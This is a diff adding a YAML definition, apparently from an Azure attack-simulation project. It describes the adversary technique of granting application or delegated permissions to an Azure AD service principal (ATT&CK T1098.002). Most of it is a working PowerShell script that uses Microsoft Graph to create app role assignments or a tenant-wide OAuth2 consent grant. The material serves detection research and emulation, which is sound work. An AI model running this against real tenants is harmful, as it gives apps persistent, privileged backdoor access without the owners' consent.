@@ -1,0 +1,107 @@
+title: grantPermissionsConsent
+id: 0721f7ce-f04b-4bdd-9fd1-aefc566aa0fb
+creationDate: '2021-08-05'
+modificationDate: '2021-08-05'
+description: |
+  A threat actor might want to grant permissions (delegated or application permissions type) to an Azure AD application (Service Principal).
+contributors:
+- Roberto Rodriguez @Cyb3rWard0g
+- MSTIC R&D
+ctiReferences:
+- https://msrc-blog.microsoft.com/2020/12/21/december-21st-2020-solorigate-resource-center/
+attackMappings:
+- technique: T1098.002
+  tactics:
+  - TA0003
+platform: Azure
+resource:
+  url: https://graph.microsoft.com/
+  authorization:
+    permissionsType: application
+    permissions:
+    - Application.ReadWrite.All
+    - AppRoleAssignment.ReadWrite.All
+    - Directory.ReadWrite.All
+parameters:
+  applicationId:
+    type: string
+    description: The Azure AD application id to retrieve the service principal associated to it.
+  resourceSpDisplayName:
+    type: string
+    description: Display name of the service principal to map/get permissions from (i.e. Microsoft Graph).
+  permissionType:
+    type: string
+    description: Type of permissions assigned. It could of type Delegated or Application.
+  permissions:
+    type: array
+    description: An array of permissions to assign to the application.
+  accessToken:
+    type: string
+    description: Access token with the right permissions to access and interact with the Azure resource.
+executor:
+  type: PowerShell
+  scriptContent: |
+    # Get service principal of Azure AD application
+    $ServicePrincipal = Invoke-MSGraph -Resource "servicePrincipals" -QueryParameters "`$filter=appId eq '$($applicationId)'" -AccessToken $accessToken -Body $body
+    if ($ServicePrincipal.value.Count -ne 1) {
+      Write-Error "Found $($ServicePrincipal.value.Count) service principals with application id '$($applicationId)'"
+    }
+    $ServicePrincipalId = $ServicePrincipal.value[0].id
+
+    # Get Service Principal to retrive permissions from
+    $ResourceSvcPrincipal = Invoke-MSGraph -Resource "servicePrincipals" -QueryParameters "`$filter=displayName eq '$resourceSpDisplayName'" -AccessToken $accessToken -Body $body
+    if ($ResourceSvcPrincipal.value.Count -ne 1) {
+      Write-Error "Found $($ResourceSvcPrincipal.value.Count) service principals with displayName '$($resourceSpDisplayName)'"
+    }
+
+    # Define additional permission variables
+    $PropertyType = Switch ($permissionType) {
+      'Delegated' { 'oauth2PermissionScopes'}
+      'Application' { 'appRoles' }
+    }
+    # Granting Permissions
+    if ($permissionType -eq 'Application') {
+      # Retrieve Role Assignments and create 'Resource Access Items'
+      $ResourceAccessItems = @()
+      Foreach ($AppPermission in $permissions) {
+        $RoleAssignment = $ResourceSvcPrincipal.value[0].$PropertyType | Where-Object { $_.Value -eq $AppPermission }
+        $ResourceAccessItem = [PSCustomObject]@{
+          "principalId" = $ServicePrincipalId
+          "resourceId"  = $ResourceSvcPrincipal.value[0].id
+          "appRoleId"   = $RoleAssignment.id
+        }
+        $ResourceAccessItems += $ResourceAccessItem
+      }
+      $RoleResults = @()
+      foreach ($role in $ResourceAccessItems) {
+        $params = @{
+          "Method"  = "Post"
+          "Uri"     = "https://graph.microsoft.com/v1.0/servicePrincipals/$($ServicePrincipalId)/appRoleAssignments"
+          "Body"    = $role | ConvertTo-Json -Compress
+          "Headers" = $headers
+        }
+        $RoleResults += $(Invoke-RestMethod @params)
+      }
+      return $RoleResults
+    }
+    elseif ($permissionType -eq 'Delegated') {
+      $body = @{
+        clientId = $ServicePrincipalId
+        consentType = "AllPrincipals"
+        principalId = $null
+        resourceId = $ResourceSvcPrincipal.value[0].id
+        scope = "$permissions"
+        startTime = "$((get-date).ToString("yyyy-MM-ddTHH:mm:ss:ffZ"))"
+        expiryTime = "$((get-date).AddYears(1).ToString("yyyy-MM-ddTHH:mm:ss:ffZ"))"
+      }
+      $params = @{
+        "Method"  = "Post"
+        "Uri"     = "https://graph.microsoft.com/v1.0/oauth2PermissionGrants"
+        "Body"    = $body | ConvertTo-Json -Compress
+        "Headers" = $headers
+      }
+      $(Invoke-RestMethod @params)
+    }
+output:
+  response:
+    type: object
